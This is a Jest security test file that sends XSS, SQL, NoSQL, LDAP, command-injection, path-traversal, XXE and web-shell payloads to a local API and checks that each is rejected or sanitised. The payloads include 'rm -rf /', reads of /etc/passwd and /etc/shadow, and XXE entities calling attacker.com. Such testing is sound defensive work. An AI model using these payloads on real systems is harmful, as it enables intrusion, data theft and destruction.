/**
 * Input Validation Security Tests
 * Testing XSS, injection attacks, and data sanitization
 */

const request = require('supertest');

describe('Input Validation Security Tests', () => {
  let authToken;
  let testUser;

  beforeAll(async () => {
    testUser = global.TestUtils.generateTestUser();
    
    await request(global.TEST_CONFIG.LOCAL_URL)
      .post('/auth/register')
      .send(testUser);

    const loginResponse = await request(global.TEST_CONFIG.LOCAL_URL)
      .post('/auth/login')
      .send({
        email: testUser.email,
        password: testUser.password
      });

    authToken = loginResponse.body.token;
  });

  describe('XSS Prevention', () => {
    test('should sanitize HTML in user inputs', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')" />',
        '<svg onload="alert(\'XSS\')" />',
        '"><script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<object data="javascript:alert(\'XSS\')"></object>',
        '<embed src="javascript:alert(\'XSS\')">',
        '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
        '<style>@import "javascript:alert(\'XSS\')";</style>'
      ];

      for (const payload of xssPayloads) {
        const response = await request(global.TEST_CONFIG.LOCAL_URL)
          .post('/product')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            name: payload,
            description: `Description with ${payload}`,
            category: 'AI Tools'
          });

        if (response.status === 201) {
          // Check that XSS payloads are sanitized
          expect(response.body.name).not.toContain('<script>');
          expect(response.body.name).not.toContain('javascript:');
          expect(response.body.name).not.toContain('onerror=');
          expect(response.body.name).not.toContain('onload=');
          expect(response.body.description).not.toContain('<script>');
        }
      }
    });

    test('should prevent stored XSS in user profiles', async () => {
      const xssPayload = '<script>document.cookie="stolen="+document.cookie</script>';
      
      const response = await request(global.TEST_CONFIG.LOCAL_URL)
        .put('/user/profile')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          bio: xssPayload,
          website: `https://evil.com/${xssPayload}`,
          firstName: xssPayload
        });

      if (response.status === 200) {
        expect(response.body.user.bio).not.toContain('<script>');
        expect(response.body.user.firstName).not.toContain('<script>');
        expect(response.body.user.website).not.toContain('<script>');
      }
    });

    test('should prevent reflected XSS in search queries', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        '\';alert("XSS");//',
        '<img src=x onerror=alert("XSS")>'
      ];

      for (const payload of xssPayloads) {
        const response = await request(global.TEST_CONFIG.LOCAL_URL)
          .get('/product/search')
          .query({ q: payload });

        // Response should not echo back unescaped payload
        if (response.status === 200) {
          const responseText = JSON.stringify(response.body);
          expect(responseText).not.toContain('<script>');
          expect(responseText).not.toContain('onerror=');
        }
      }
    });

    test('should sanitize file names and descriptions', async () => {
      const maliciousFileName = '<script>alert("XSS")</script>.jpg';
      const maliciousDescription = '<img src="x" onerror="alert(\'XSS\')" />';

      const response = await request(global.TEST_CONFIG.LOCAL_URL)
        .post('/api/files/upload')
        .set('Authorization', `Bearer ${authToken}`)
        .field('description', maliciousDescription)
        .attach('file', Buffer.from('fake image content'), maliciousFileName);

      if (response.status === 200 || response.status === 201) {
        expect(response.body.fileName).not.toContain('<script>');
        expect(response.body.description).not.toContain('onerror=');
      }
    });
  });

  describe('SQL Injection Prevention', () => {
    test('should prevent SQL injection in search parameters', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE products; --",
        "' OR '1'='1",
        "1' UNION SELECT username, password FROM users --",
        "'; INSERT INTO products (name) VALUES ('hacked'); --",
        "admin'/*",
        "admin'#",
        "' OR 1=1#",
        "' OR 1=1--",
        "' OR 'a'='a",
        "') OR ('1'='1"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(global.TEST_CONFIG.LOCAL_URL)
          .get('/product/search')
          .query({ 
            q: payload,
            category: payload,
            sort: payload
          });

        // Should not cause database errors or unauthorized data access
        expect(response.status).toBeLessThan(500);
        
        if (response.status === 200) {
          // Should return normal search results, not error messages or database schema
          expect(Array.isArray(response.body.products || response.body)).toBe(true);
        }
      }
    });

    test('should prevent SQL injection in user authentication', async () => {
      const sqlPayloads = [
        "admin'--",
        "admin'/*",
        "' OR '1'='1' --",
        "' OR 1=1#",
        "') OR ('1'='1"
      ];

      for (const payload of sqlPayloads) {
        const response = await request(global.TEST_CONFIG.LOCAL_URL)
          .post('/auth/login')
          .send({
            email: payload,
            password: payload
          });

        // Should not authenticate with SQL injection payloads
        expect(response.status).not.toBe(200);
        expect(response.body).not.toHaveProperty('token');
      }
    });

    test('should handle SQL injection in numeric parameters', async () => {
      const numericPayloads = [
        "1; DROP TABLE products; --",
        "1 OR 1=1",
        "1' OR '1'='1",
        "1 UNION SELECT * FROM users"
      ];

      for (const payload of numericPayloads) {
        const response = await request(global.TEST_CONFIG.LOCAL_URL)
          .get(`/product/${payload}`);

        // Should return 404 or validation error, not server error
        expect(response.status).not.toBe(500);
      }
    });
  });

  describe('NoSQL Injection Prevention', () => {
    test('should prevent NoSQL injection in query parameters', async () => {
      const noSqlPayloads = [
        { $ne: null },
        { $gt: '' },
        { $regex: '.*' },
        { $where: 'this.username == this.password' },
        { $or: [{ username: 'admin' }, { username: 'root' }] },
        { username: { $ne: null }, password: { $ne: null } },
        { $expr: { $gt: [{ $strLenCP: '$password' }, 0] } }
      ];

      for (const payload of noSqlPayloads) {
        const response = await request(global.TEST_CONFIG.LOCAL_URL)
          .post('/auth/login')
          .send({
            email: payload,
            password: payload
          });

        // Should reject NoSQL injection attempts
        expect(response.status).toBe(400);
        expect(response.body).toHaveProperty('error');
      }
    });

    test('should validate JSON input structure', async () => {
      const malformedPayloads = [
        { '$regex': '.*', '$options': 'i' },
        { '$ne': null },
        { '$gt': '' },
        { '$exists': true },
        { '$nin': ['admin'] }
      ];

      for (const payload of malformedPayloads) {
        const response = await request(global.TEST_CONFIG.LOCAL_URL)
          .post('/product')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            name: 'Test Product',
            description: 'Test Description',
            filters: payload
          });

        // Should reject or sanitize NoSQL operators
        if (response.status === 201) {
          expect(JSON.stringify(response.body)).not.toContain('$regex');
          expect(JSON.stringify(response.body)).not.toContain('$ne');
        }
      }
    });
  });

  describe('Command Injection Prevention', () => {
    test('should prevent command injection in file operations', async () => {
      const commandInjectionPayloads = [
        '; ls -la',
        '&& cat /etc/passwd',
        '| whoami',
        '`id`',
        '$(whoami)',
        '; rm -rf /',
        '& ping -c 4 attacker.com',
        '\n/bin/sh\n'
      ];

      for (const payload of commandInjectionPayloads) {
        const response = await request(global.TEST_CONFIG.LOCAL_URL)
          .post('/api/files/process')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            operation: 'resize',
            filename: `test${payload}.jpg`,
            options: {
              width: `100${payload}`,
              height: '100'
            }
          });

        // Should reject command injection attempts
        expect(response.status).toBeGreaterThanOrEqual(400);
      }
    });

    test('should sanitize file paths', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        '....//....//....//etc//passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
      ];

      for (const payload of pathTraversalPayloads) {
        const response = await request(global.TEST_CONFIG.LOCAL_URL)
          .post('/api/files/upload')
          .set('Authorization', `Bearer ${authToken}`)
          .attach('file', Buffer.from('test content'), payload);

        // Should reject path traversal attempts
        expect(response.status).toBeGreaterThanOrEqual(400);
        if (response.body.error) {
          expect(response.body.error.toLowerCase()).toMatch(/invalid|path|filename/);
        }
      }
    });
  });

  describe('LDAP Injection Prevention', () => {
    test('should prevent LDAP injection in user searches', async () => {
      const ldapPayloads = [
        '*)(uid=*',
        '*)(|(uid=*',
        '*)(&(uid=*',
        '*))(|(uid=*',
        '*))%00',
        '*(|(password=*))',
        '*(|(objectClass=*))'
      ];

      for (const payload of ldapPayloads) {
        const response = await request(global.TEST_CONFIG.LOCAL_URL)
          .get('/api/users/search')
          .set('Authorization', `Bearer ${authToken}`)
          .query({ q: payload });

        // Should not expose LDAP structure or unauthorized data
        expect(response.status).toBeLessThan(500);
        if (response.status === 200) {
          expect(Array.isArray(response.body.users || response.body)).toBe(true);
        }
      }
    });
  });

  describe('XML Injection Prevention', () => {
    test('should prevent XXE attacks', async () => {
      const xxePayloads = [
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com/steal">]><test>&xxe;</test>',
        '<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe">%xxe;]>'
      ];

      for (const payload of xxePayloads) {
        const response = await request(global.TEST_CONFIG.LOCAL_URL)
          .post('/api/import')
          .set('Authorization', `Bearer ${authToken}`)
          .set('Content-Type', 'application/xml')
          .send(payload);

        // Should reject XXE attempts
        expect(response.status).toBeGreaterThanOrEqual(400);
      }
    });
  });

  describe('File Upload Security', () => {
    test('should validate file types', async () => {
      const maliciousFiles = [
        { name: 'virus.exe', content: 'MZ\x90\x00\x03\x00\x00\x00', type: 'application/octet-stream' },
        { name: 'script.php', content: '<?php system($_GET["cmd"]); ?>', type: 'application/x-php' },
        { name: 'shell.jsp', content: '<%@ page import="java.io.*" %>', type: 'text/plain' },
        { name: 'backdoor.asp', content: '<%eval request("cmd")%>', type: 'text/plain' }
      ];

      for (const file of maliciousFiles) {
        const response = await request(global.TEST_CONFIG.LOCAL_URL)
          .post('/api/files/upload')
          .set('Authorization', `Bearer ${authToken}`)
          .attach('file', Buffer.from(file.content), file.name);

        // Should reject malicious file types
        expect(response.status).toBeGreaterThanOrEqual(400);
        if (response.body.error) {
          expect(response.body.error.toLowerCase()).toMatch(/file.*type|invalid.*file/);
        }
      }
    });

    test('should check file content vs extension', async () => {
      // PHP script disguised as image
      const maliciousContent = '<?php system($_GET["cmd"]); ?>';
      
      const response = await request(global.TEST_CONFIG.LOCAL_URL)
        .post('/api/files/upload')
        .set('Authorization', `Bearer ${authToken}`)
        .attach('file', Buffer.from(maliciousContent), 'fake-image.jpg');

      // Should detect content mismatch
      expect(response.status).toBeGreaterThanOrEqual(400);
    });

    test('should limit file sizes', async () => {
      // Create a large file buffer (10MB)
      const largeFile = Buffer.alloc(10 * 1024 * 1024, 'A');
      
      const response = await request(global.TEST_CONFIG.LOCAL_URL)
        .post('/api/files/upload')
        .set('Authorization', `Bearer ${authToken}`)
        .attach('file', largeFile, 'large-file.txt');

      // Should reject files that are too large
      expect(response.status).toBeGreaterThanOrEqual(400);
      if (response.body.error) {
        expect(response.body.error.toLowerCase()).toMatch(/file.*size|too.*large/);
      }
    });

    test('should scan for malware signatures', async () => {
      // EICAR test string (harmless malware signature)
      const eicarSignature = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
      
      const response = await request(global.TEST_CONFIG.LOCAL_URL)
        .post('/api/files/upload')
        .set('Authorization', `Bearer ${authToken}`)
        .attach('file', Buffer.from(eicarSignature), 'eicar.txt');

      // Should detect and reject malware
      expect(response.status).toBeGreaterThanOrEqual(400);
      if (response.body.error) {
        expect(response.body.error.toLowerCase()).toMatch(/malware|virus|threat/);
      }
    });
  });

  describe('Rate Limiting and DoS Prevention', () => {
    test('should rate limit API requests', async () => {
      const requests = Array.from({ length: 50 }, () =>
        request(global.TEST_CONFIG.LOCAL_URL)
          .get('/product')
          .set('Authorization', `Bearer ${authToken}`)
      );

      const responses = await Promise.allSettled(requests);
      const rateLimitedResponses = responses.filter(response => 
        response.status === 'fulfilled' && response.value.status === 429
      );

      // Should have some rate limited responses
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    test('should prevent ReDoS attacks', async () => {
      // Regular expression DoS attack
      const redosPayload = 'a'.repeat(50000) + '!';
      
      const startTime = Date.now();
      
      const response = await request(global.TEST_CONFIG.LOCAL_URL)
        .get('/product/search')
        .query({ q: redosPayload })
        .timeout(5000);

      const endTime = Date.now();
      const responseTime = endTime - startTime;

      // Should not take excessive time to process
      expect(responseTime).toBeLessThan(5000);
      expect(response.status).toBeLessThan(500);
    });

    test('should limit request payload size', async () => {
      // Create oversized payload
      const oversizedPayload = {
        name: 'Test Product',
        description: 'A'.repeat(1024 * 1024), // 1MB description
        metadata: new Array(10000).fill({ key: 'value', data: 'x'.repeat(100) })
      };

      const response = await request(global.TEST_CONFIG.LOCAL_URL)
        .post('/product')
        .set('Authorization', `Bearer ${authToken}`)
        .send(oversizedPayload);

      // Should reject oversized payloads
      expect(response.status).toBeGreaterThanOrEqual(400);
    });
  });

  describe('Data Sanitization', () => {
    test('should sanitize HTML entities', async () => {
      const htmlEntities = [
        '&lt;script&gt;alert("XSS")&lt;/script&gt;',
        '&quot;onmouseover=&quot;alert(1)&quot;',
        '&amp;amp;lt;script&amp;amp;gt;',
        '&#60;script&#62;alert("XSS")&#60;/script&#62;',
        '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;'
      ];

      for (const entity of htmlEntities) {
        const response = await request(global.TEST_CONFIG.LOCAL_URL)
          .post('/product')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            name: entity,
            description: `Description with ${entity}`,
            category: 'AI Tools'
          });

        if (response.status === 201) {
          // Should properly decode and sanitize HTML entities
          expect(response.body.name).not.toContain('&lt;script&gt;');
          expect(response.body.name).not.toContain('&#60;script&#62;');
        }
      }
    });

    test('should normalize Unicode input', async () => {
      const unicodePayloads = [
        '\u003cscript\u003ealert("XSS")\u003c/script\u003e',
        '\uFF1Cscript\uFF1Ealert("XSS")\uFF1C/script\uFF1E',
        '\u0001\u0002\u0003\u0004\u0005',
        '\ufeff<script>alert("XSS")</script>',
        'test\u0000null\u0000byte'
      ];

      for (const payload of unicodePayloads) {
        const response = await request(global.TEST_CONFIG.LOCAL_URL)
          .post('/product')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            name: payload,
            description: `Unicode test: ${payload}`,
            category: 'AI Tools'
          });

        if (response.status === 201) {
          // Should sanitize Unicode-encoded scripts
          expect(response.body.name).not.toContain('<script>');
          expect(response.body.name).not.toContain('\u0000');
        }
      }
    });

    test('should handle special characters properly', async () => {
      const specialChars = [
        'Test & Company',
        'Price: $100 < $200',
        'Math: 2 > 1',
        'Quote: "Hello World"',
        "Apostrophe: Don't stop",
        'Symbols: @#$%^&*()',
        'Unicode: 你好世界'
      ];

      for (const input of specialChars) {
        const response = await request(global.TEST_CONFIG.LOCAL_URL)
          .post('/product')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            name: input,
            description: `Special chars test: ${input}`,
            category: 'AI Tools'
          });

        if (response.status === 201) {
          // Should preserve legitimate special characters
          expect(response.body.name).toBeTruthy();
          expect(response.body.description).toContain(input);
        }
      }
    });
  });
});